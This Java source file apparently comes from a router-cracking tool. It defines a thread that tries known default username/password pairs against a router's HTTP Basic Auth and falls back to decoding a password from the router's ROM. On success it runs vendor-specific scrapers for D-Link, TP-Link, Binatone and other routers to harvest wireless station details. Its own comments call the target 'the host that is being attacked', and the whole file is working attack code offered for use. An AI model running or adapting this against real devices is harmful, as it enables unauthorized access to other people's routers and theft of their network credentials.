/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.authtrial.threads;

import org.apache.http.auth.AuthScope;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.net.def.beans.Credentials;
import org.koreops.tauro.cli.scraper.AbstractScraper;
import org.koreops.tauro.cli.scraper.basicauth.BinatoneScraper;
import org.koreops.tauro.cli.scraper.basicauth.CoshipScraper;
import org.koreops.tauro.cli.scraper.basicauth.DLinkScraper;
import org.koreops.tauro.cli.scraper.basicauth.DigiflipScraper;
import org.koreops.tauro.cli.scraper.basicauth.NewIBallBatonScraper;
import org.koreops.tauro.cli.scraper.basicauth.NewTpLinkScraper;
import org.koreops.tauro.cli.scraper.basicauth.TpLinkScraper;
import org.koreops.tauro.core.loggers.Logger;

import java.net.URI;

/**
 * This class tries out for Http Basic Authentication trials for the router in hand.
 * It will try every known default User/Pass combination to try to see if the router is accessible.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 * @since 21 Sep, 2013 6:31 PM
 */
public class DefaultAuthTrial extends AbstractAuthTrial {

  /**
   * Constructor for the Http Basic Auth Default Login trial.
   *
   * @param host    The host that is being attacked
   * @param port    The port on which the HTTP server is running
   */
  public DefaultAuthTrial(String host, String port) {
    super();
    this.host = host;
    if (port != null) {
      this.port = Integer.valueOf(port);
    } else {
      this.port = 80;
    }
  }

  @Override
  public void run() {
    CredentialsProvider credsProvider = new BasicCredentialsProvider();

    RequestConfig config = RequestConfig.custom().setConnectTimeout(10000).setSocketTimeout(20000).setConnectionRequestTimeout(20000).build();
    HttpGet httpget = new HttpGet();
    httpget.setConfig(config);

    String hostUrl = null;
    Credentials successCredentials = null;

    for (Credentials credentials : CREDENTIALS_LIST) {
      credsProvider.setCredentials(new AuthScope(host, port), credentials.getUsernamePasswordCredentials());
      try (CloseableHttpClient httpclient = HttpClients.custom().setDefaultCredentialsProvider(credsProvider).build()) {
        httpget.setURI(new URI(this.forgeUrl("http://", host, port, "/")));

        try (CloseableHttpResponse response = httpclient.execute(httpget)) {
          if (response.getStatusLine().getStatusCode() == 200) {
            hostUrl = this.forgeUrl("http://", host, port, "/");
            String browserUrl = this.forgeUrl(("http://" + credentials.getUsername() + ":" + credentials.getPassword() + "@"), host, port, "/");
            Logger.info("Found: " + browserUrl);
            successCredentials = credentials;
          }
        }
      } catch (Exception e) {
        Logger.error(host + ": " + e.getMessage());
      }

      if (successCredentials != null) {
        break;
      }
    }

    // Let's try a rom decode as a last resort.
    if (successCredentials == null) {
      String pass = this.decodeRomGetPass();
      if (pass != null) {
        hostUrl = this.forgeUrl("http://", host, port, "/");
        successCredentials = new Credentials("admin", pass);

        credsProvider.setCredentials(new AuthScope(host, port), successCredentials.getUsernamePasswordCredentials());
        try (CloseableHttpClient httpclient = HttpClients.custom().setDefaultCredentialsProvider(credsProvider).build()) {
          httpget.setURI(new URI(this.forgeUrl("http://", host, port, "/")));

          try (CloseableHttpResponse response = httpclient.execute(httpget)) {
            if (response.getStatusLine().getStatusCode() == 200) {
              String browserUrl = this.forgeUrl("http://" + "admin:" + pass + "@", host, port, "/");
              Logger.info("Found: " + browserUrl);
            }
          }
        } catch (Exception e) {
          Logger.error(host + ": " + e.getMessage());
        }
      }
    }

    if (successCredentials == null) {
      Logger.info("Not Found: " + host);
    } else {
      logWirelessStation(hostUrl, new AuthCrackParams(successCredentials, null, null, null));
    }
  }

  @Override
  protected void logWirelessStation(String hostUrl, AuthCrackParams params) {
    AbstractScraper scraper;
    boolean success;

    System.out.println("Trying Binatone Scraper.");
    scraper = new BinatoneScraper(host, hostUrl, params);
    success = scraper.scrape();
    if (success) {
      return;
    }

    System.out.println("Trying DLink Scraper.");
    scraper = new DLinkScraper(host, hostUrl, params);
    success = scraper.scrape();
    if (success) {
      return;
    }

    System.out.println("Trying New iBall Baton Scraper.");
    scraper = new NewIBallBatonScraper(host, hostUrl, params);
    success = scraper.scrape();
    if (success) {
      return;
    }

    System.out.println("Trying Digiflip Scraper.");
    scraper = new DigiflipScraper(host, hostUrl, params);
    success = scraper.scrape();
    if (success) {
      return;
    }

    System.out.println("Trying New TPLink Scraper.");
    scraper = new NewTpLinkScraper(host, hostUrl, params);
    success = scraper.scrape();
    if (success) {
      return;
    }

    System.out.println("Trying Old TPLink Scraper.");
    scraper = new TpLinkScraper(host, hostUrl, params);
    success = scraper.scrape();
    if (success) {
      return;
    }

    System.out.println("Trying COSHIP Scraper.");
    scraper = new CoshipScraper(host, hostUrl, params);
    success = scraper.scrape();
    if (success) {
      return;
    }

    Logger.error(host + ": is not our run o' the Mill Modem.");
  }
}
